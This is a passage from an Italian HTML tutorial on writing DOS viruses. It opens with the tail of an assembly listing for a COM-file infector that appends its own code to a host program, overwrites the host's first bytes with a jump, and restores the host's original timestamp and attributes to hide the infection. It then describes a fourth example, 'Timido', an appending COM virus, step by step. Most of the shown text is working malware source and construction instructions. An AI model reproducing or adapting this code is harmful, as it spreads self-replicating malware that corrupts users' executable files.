<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ax,4301h<span style="mso-spacerun: yes">                  </span>; funzione
cambia attributi<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>xor
cx,cx<span style="mso-spacerun: yes">                     </span>; attributi a
zero<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>lea
dx,[bp+NEW_DTA+30]<span style="mso-spacerun: yes">        </span>; punta al DTA
del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>int
21h<span style="mso-spacerun: yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Calcolo il numero dei bytes da saltare dopo<span
style="mso-spacerun: yes">  </span>il JMP<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">          </span><span
style="mso-spacerun: yes">        </span>mov ax,word ptr [bp+NEW_DTA+26] ;
misura del file in AX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>sub
ax,3<span style="mso-spacerun: yes">                        </span>; tolgo i 3
bytes del JMP<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
word ptr [bp+JMP_OFFSET],ax ; e li salvo qui<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Chiudo il file e lo riapro in lettura/scrittura. BX contiene
l’handle del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ah,3eh<span style="mso-spacerun: yes">                    </span>; chiudo il
file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>int 21h<span style="mso-spacerun: yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span>mov ax,3d02h<span style="mso-spacerun:
yes">                  </span>; apro il file, read/write<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>int 21h<span style="mso-spacerun: yes">      </span><span
style="mso-spacerun: yes">                 </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>xchg
ax,bx<span style="mso-spacerun: yes">                    </span>; metto
l’handle in BX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; scrivo l’istruzione di salto all’inizio dell’host<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ah,40h<span style="mso-spacerun: yes">                    </span>; funzione di
scrittura<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
cx,3<span style="mso-spacerun: yes">             </span><span
style="mso-spacerun: yes">         </span>; scrivo 3 3 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>lea
dx,[bp+HEADER]<span style="mso-spacerun: yes">            </span>; e li prendo
da qui<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>int
21h<span style="mso-spacerun: yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ora devo attaccare il codice virale alla fine dell’host<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
al,2<span style="mso-spacerun: yes">                      </span>; fine del
file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>call
FILE_PTR<span style="mso-spacerun: yes">                 </span>; muovo il file
pointer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ah,40h<span style="mso-spacerun: yes">                    </span>; funzione di
scrittura<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
cx,END_VIRUS-START_VIRUS<span style="mso-spacerun: yes">  </span>; lunghezza dl
codice virale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>lea
dx,[bp+START_VIRUS]<span style="mso-spacerun: yes">       </span>; copio il
codice da qui<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>int
21h<span style="mso-spacerun: yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Ripristino l’ora e la data originali. Questi valori erano
stati salvati nella DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ax,5701h<span style="mso-spacerun: yes">                    </span>; setto ora
e data<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
cx,word ptr [bp+NEW_DTA+22] ; Setto ora<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
dx,word ptr [bp+NEW_DTA+24] ; Setto data<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>int
21h<span style="mso-spacerun: yes">                         </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ripristino gli attributi originali dell’host<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov ax,4301h<span
style="mso-spacerun: yes">                    </span>; cambio attributi<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
cx,word ptr [bp+NEW_DTA+21] ; prendo gli attr. originali<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>lea
dx,[bp+NEW_DTA+30]<span style="mso-spacerun: yes">          </span>; punta al
nome del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>int
21h<span style="mso-spacerun: yes">                         </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; chiudo il file e ritorno <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov ah,3eh<span style="mso-spacerun: yes">                    </span>;
chiudo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span></span></b><b><span lang=FR style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF;mso-ansi-language:FR'>int 21h<span
style="mso-spacerun: yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun:
yes">                  </span>jmp QUIT<span style="mso-spacerun:
yes">                      </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;*** Subroutine SET_DTA ***<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>SET_DTA<span style="mso-spacerun:
yes">           </span>proc near<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">            </span><span style="mso-spacerun: yes">      </span>mov
ah,1ah<span style="mso-spacerun: yes">                    </span>; set DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span>int 21h<span style="mso-spacerun:
yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span>retn<span style="mso-spacerun:
yes">                          </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>SET_DTA<span style="mso-spacerun:
yes">           </span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;*** Subroutine FILE_PTR ***<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>FILE_PTR<span style="mso-spacerun:
yes">          </span>proc near<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>mov ah,42h<span style="mso-spacerun:
yes">                    </span>; funzione puntatore al file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>xor
cx,cx<span style="mso-spacerun: yes">                     </span>; inidirizzo a
zero<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>cwd<span style="mso-spacerun: yes">                           </span>;
come xor dx,dx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span>int 21h<span style="mso-spacerun:
yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>retn<span style="mso-spacerun:
yes">                          </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>FILE_PTR<span style="mso-spacerun: yes">          </span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; questa area conterrà le variabili compilate<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>COM_MASK<span style="mso-spacerun: yes">          </span>db
'*.com',0<span style="mso-spacerun: yes">                  </span>; maschera
per la ricerca del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>ORIG_START<span style="mso-spacerun:
yes">        </span>db 0cdh,20h,0<span style="mso-spacerun:
yes">                 </span>; salvataggio primi bytes host<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>HEADER<span style="mso-spacerun: yes">            </span>db
0e9h<span style="mso-spacerun: yes">                       </span>; istruzione
Jmp<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>START_VIRUS<span style="mso-spacerun: yes">       </span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>END_VIRUS<span style="mso-spacerun: yes">         </span>equ
$<span style="mso-spacerun: yes">                         </span>; segna la
fine del codice virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; questa area eè “scratch” e non è inclusa nel codice del virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>JMP_OFFSET<span style="mso-spacerun: yes">    </span><span
style="mso-spacerun: yes">    </span>dw ?<span style="mso-spacerun:
yes">                          </span>; indirizzo Jump<span
style="mso-spacerun: yes">  </span>per<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>NEW_DTA<span style="mso-spacerun: yes">           </span>db 43
dup(?)<span style="mso-spacerun: yes">                  </span>; nuova
locazione DTA<span style="mso-spacerun: yes">                 </span>end MAIN<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;***********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>IV° Esempio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Timido - Virus COM-infettore non sovrascrittore.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Questo tipo di virus deriva direttamente dal modello
TIMID creato da Mark Ludwig. A differenza del precedente risulta più
sofisticato in quanto non sovrascrive il programma ospitante rendendo così
possibile la sua esecuzione. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Timido si installa alla fine di un solo file con
estensione *.COM della directory corrente. I primi cinque bytes del programma
ospitante vengono salvati e al loro posto viene inserita un’istruzione di salto
(JMP) al resto del codice virale scritto alla fine del file COM.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>Ogni programma COM ospitante (host) infettato ha
quindi i primi cinque bytes del codice modificati. I 5 bytes originari
rimangono memorizzati all’interno del codice del virus che è attaccato alla
fine del codice del’host. Tali bytes sono necessari all’esecuzione del
programma host una volta che è stato caricato in memoria. Le ultime operazioni
del virus dopo che ha eseguito la sua opera di infezione saranno quelle di
ripristinare questi 5 bytes e rilasciare il controllo al programma host che
potrà così essere eseguito.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>Le
operazioni che compie il virus una volta caricato in memoria sono le seguenti:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo21;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>1.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>un
programma ospitante infettato viene caricato in memoria; il virus effettua il
jump al codice virale scavalcando il codice del programma ospitante e prendendo
il controllo;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo21;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>2.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>il
virus cerca un file COM da infettare nella directory corrente;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo21;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>3.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>se
trovato, il virus appende sé stesso alla fine del file;<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo21;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>4.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>il
virus legge i primi 5 bytes del file trovato nella directory e li salva. START_IMAGE
contiene i 5 bytes del file su disco, mentre INIZIO_CODICE contiene i 5 bytes
del file host in memoria<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo21;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>5.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>il
virus scrive l’istruzione di salto nel nuovo programma ospitante al posto dei
suoi primi 5 bytes originari. A tale scopo: a) setta il puntatore al file alla
locazione di INIZIO_CODICE nel file su disco; b) scrive i 5 bytes di
START_IMAGE nella locazione di INIZIO_CODICE sul file del disco; c) scrive
l’istruzione di salto.<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo21;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>6.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>il
virus prende i bytes che erano originariamente i primi del suo file ospitante
(quello attualmente in memoria), e li rimette all’indirizzo 100H. In questo
modo la copia del programma COM ospitante in memoria sarà ripulita
dall’istruzione di salto, mentre la copia su disco dello stesso programma
rimarrà inalterata.<span style='mso-tab-count:1'>      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l2 level1 lfo21;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>7.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Il
controllo salta a 100H facendo eseguire il codice dell’host in memoria. AL
termine del processo infettivo nella directory corrente ci sono due programmi
COM infetti.<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
